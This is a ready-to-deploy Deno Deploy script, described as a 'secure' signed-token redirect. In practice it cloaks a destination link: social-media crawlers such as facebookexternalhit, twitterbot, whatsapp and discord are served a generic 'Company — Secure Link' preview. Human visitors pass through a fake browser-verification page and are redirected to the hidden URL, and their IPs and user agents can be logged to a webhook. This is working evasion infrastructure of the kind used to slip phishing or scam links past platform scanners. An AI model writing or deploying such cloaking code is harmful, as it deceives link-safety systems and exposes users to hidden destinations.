// main.ts - Deno Deploy: signed-token redirect (secure, privacy-preserving)
// - Signed short-lived tokens (HMAC-SHA256) hide the real URL from source
// - /token (POST) issues token, /r?token=... validates and redirects
// - /preview returns safe OG metadata for debuggers
// - Rate limiting and optional webhook logging

// CONFIG
const REAL_URL = "https://google.com"; // your real destination
const SECRET = (() => {
  // use stable secret per-deploy. In production put this in env / secrets manager.
  // NOTE: for Deno Deploy you should set this via secrets (Deno Deploy dashboard)
  const s = Deno.env.get("REDIRECT_SECRET");
  if (s) return s;
  // fallback—this means tokens won't persist across restarts; for quick testing only
  return "change_this_to_a_strong_secret_in_production_32bytes_min";
})();
const TOKEN_TTL_SECONDS = 30; // very short-lived
const COOKIE_NAME = "v10_human";
const COOKIE_AGE = 60 * 60 * 6; // 6 hours
const RATE_WINDOW_MS = 60 * 1000;
const RATE_MAX = 60;
const WEBHOOK = ""; // optional webhook URL for logs

// preview metadata shown to social inspectors
const PREVIEW_META = {
  title: "Company — Secure Link",
  description: "Secure link — click to proceed.",
  image: "", // optional absolute URL
};

// in-memory rate map (ephemeral edge memory)
const rateMap = new Map<string, { count: number; start: number }>();

// ----- helper functions -----
function parseCookies(cookie = "") {
  const out: Record<string, string> = {};
  if (!cookie) return out;
  for (const part of cookie.split(";")) {
    const [k, ...v] = part.trim().split("=");
    if (!k) continue;
    out[k] = decodeURIComponent(v.join("="));
  }
  return out;
}

function getIp(req: Request) {
  const h = req.headers;
  const xff = h.get("x-forwarded-for");
  if (xff) return xff.split(",")[0].trim();
  return (h.get("cf-connecting-ip") || h.get("x-real-ip") || "unknown");
}

function rateLimit(ip: string) {
  const now = Date.now();
  const rec = rateMap.get(ip);
  if (!rec || now - rec.start > RATE_WINDOW_MS) {
    rateMap.set(ip, { count: 1, start: now });
    return;
  }
  rec.count++;
  if (rec.count > RATE_MAX) throw new Error("rate_limited");
  rateMap.set(ip, rec);
}

// HMAC-SHA256 sign and verify using Web Crypto
async function importKey(secret: string) {
  const enc = new TextEncoder().encode(secret);
  return await crypto.subtle.importKey("raw", enc, { name: "HMAC", hash: "SHA-256" }, false, ["sign", "verify"]);
}

async function hmacSign(keyHandle: CryptoKey, msg: string) {
  const data = new TextEncoder().encode(msg);
  const sig = await crypto.subtle.sign("HMAC", keyHandle, data);
  return btoa(String.fromCharCode(...new Uint8Array(sig))).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
}
async function hmacVerify(keyHandle: CryptoKey, msg: string, sigB64url: string) {
  // convert base64url back to Uint8Array
  const pad = (4 - (sigB64url.length % 4)) % 4;
  const b64 = sigB64url.replace(/-/g, "+").replace(/_/g, "/") + "=".repeat(pad);
  const raw = Uint8Array.from(atob(b64), c => c.charCodeAt(0));
  return await crypto.subtle.verify("HMAC", keyHandle, raw, new TextEncoder().encode(msg));
}

// create token: payload JSON {exp, iat, nonce} encoded as base64url + '.' + sig
async function createToken() {
  const key = await importKey(SECRET);
  const iat = Math.floor(Date.now() / 1000);
  const exp = iat + TOKEN_TTL_SECONDS;
  const payload = { iat, exp, nonce: crypto.randomUUID() };
  const payloadStr = JSON.stringify(payload);
  const payloadB64 = btoa(payloadStr).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/g, "");
  const sig = await hmacSign(key, payloadB64);
  return payloadB64 + "." + sig;
}
async function verifyToken(token: string) {
  try {
    const key = await importKey(SECRET);
    const [payloadB64, sig] = token.split(".");
    if (!payloadB64 || !sig) return false;
    const ok = await hmacVerify(key, payloadB64, sig);
    if (!ok) return false;
    const payloadStr = atob(payloadB64.replace(/-/g, "+").replace(/_/g, "/"));
    const payload = JSON.parse(payloadStr);
    const now = Math.floor(Date.now() / 1000);
    return payload.exp && payload.exp >= now;
  } catch {
    return false;
  }
}

// sanitized preview HTML for debuggers
function previewHtml(meta = PREVIEW_META) {
  const img = meta.image ? `<meta property="og:image" content="${meta.image}" />` : "";
  return `<!doctype html><html><head>
<meta charset="utf-8"/><meta name="robots" content="noindex,nofollow"/>
<meta property="og:title" content="${escapeHtml(meta.title)}"/>
<meta property="og:description" content="${escapeHtml(meta.description)}"/>
${img}<title>${escapeHtml(meta.title)}</title></head><body><h1>${escapeHtml(meta.title)}</h1><p>${escapeHtml(meta.description)}</p></body></html>`;
}
function escapeHtml(s = "") {
  return s.replace(/[&<>"']/g, c => ({ "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" }[c] || c));
}

// optional webhook logger (best-effort)
async function maybeLog(payload: object) {
  if (!WEBHOOK) return;
  try {
    await fetch(WEBHOOK, { method: "POST", headers: { "content-type": "application/json" }, body: JSON.stringify(payload) });
  } catch {}
}

// ---- Main handler ----
export default {
  async fetch(req: Request): Promise<Response> {
    try {
      const url = new URL(req.url);
      const ip = getIp(req);
      const ua = req.headers.get("user-agent") || "";
      rateLimit(ip);

      // HEAD: return preview for debuggers (they often use HEAD)
      if (req.method === "HEAD") {
        // lightweight preview response (200) so debuggers can fetch metadata
        return new Response(previewHtml(), { status: 200, headers: { "content-type": "text/html; charset=utf-8" } });
      }

      // preview endpoints: if they present an inspector UA we can choose to show preview
      const lowUa = ua.toLowerCase();
      const isPreview = ["facebookexternalhit", "facebot", "twitterbot", "linkedinbot", "whatsapp", "telegram", "discord"].some(s => lowUa.includes(s));
      if (isPreview) {
        await maybeLog({ event: "preview", ua, ip, ts: Date.now() });
        return new Response(previewHtml(), { status: 200, headers: { "content-type": "text/html; charset=utf-8" } });
      }

      // cookie path: if cookie present, immediate redirect (good UX)
      const cookies = parseCookies(req.headers.get("cookie") || "");
      if (cookies[COOKIE_NAME]) {
        // optional: verify token-like format or just redirect
        return Response.redirect(REAL_URL, 302);
      }

      // token issuance endpoint - POST only, returns token for short TTL
      if (url.pathname === "/token" && req.method === "POST") {
        // do quick UA checks (reduce abuse)
        if (!ua || ua.length < 10) {
          await maybeLog({ event: "bad_token_attempt", ua, ip, ts: Date.now() });
          return new Response("", { status: 204 });
        }
        const token = await createToken();
        // return token JSON - client will immediately go to /r?token=...
        await maybeLog({ event: "issue_token", ip, ua, ts: Date.now() });
        return new Response(JSON.stringify({ ok: true, token }), {
          status: 200,
          headers: { "content-type": "application/json; charset=utf-8" },
        });
      }

      // redirect validation endpoint - verifies token then redirects to REAL_URL
      if (url.pathname === "/r" && req.method === "GET") {
        const token = url.searchParams.get("token") || "";
        const ok = await verifyToken(token);
        if (!ok) {
          await maybeLog({ event: "invalid_token", ip, ua, token_present: !!token, ts: Date.now() });
          return new Response("Invalid or expired token", { status: 403 });
        }
        // set a persistent cookie so they won't be challenged for a while
        const headers = new Headers();
        headers.set("set-cookie", `${COOKIE_NAME}=1; Path=/; Max-Age=${COOKIE_AGE}; SameSite=Lax`);
        headers.set("location", REAL_URL);
        await maybeLog({ event: "redirect", ip, ua, ts: Date.now() });
        return new Response(null, { status: 302, headers });
      }

      // Default route: serve the lightweight challenge page that posts to /token and then visits /r?token=
      const tokenPage = `<!doctype html><html><head><meta charset="utf-8"><meta name="robots" content="noindex,nofollow"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Verifying…</title></head><body style="font-family:system-ui;margin:40px;text-align:center">
<h3>One more step — verifying your browser</h3>
<p>This prevents automated abuse. You will be redirected automatically.</p>
<button id="go">Continue</button>
<script>
(async function(){
  const btn = document.getElementById("go");
  async function fetchToken(){
    try{
      const resp = await fetch('/token', { method: 'POST', credentials: 'same-origin' });
      if(!resp.ok) throw new Error('no-token');
      const j = await resp.json();
      if(j && j.token){
        // navigate to validation endpoint
        location.replace('/r?token=' + encodeURIComponent(j.token));
      } else throw new Error('bad');
    }catch(e){
      // fallback: show manual link that includes base64 of redirect (only used if token flow fails)
      const fallback = 'data:text/plain;base64,' + btoa('Manual fallback: ask admin');
      document.body.innerHTML = '<p>Verification failed. Please try again or contact support.</p>';
    }
  }
  btn.addEventListener('click', fetchToken);
  // auto-run after tiny delay for UX (allows slow devices to run JS)
  setTimeout(fetchToken, 400);
})();
</script>
<noscript><p>Please enable JavaScript to continue or contact support.</p></noscript>
</body></html>`;
      return new Response(tokenPage, { status: 200, headers: { "content-type": "text/html; charset=utf-8" } });

    } catch (e) {
      if (String(e).includes("rate_limited")) return new Response("Too many requests", { status: 429 });
      return new Response("Server error", { status: 500 });
    }
  }
};
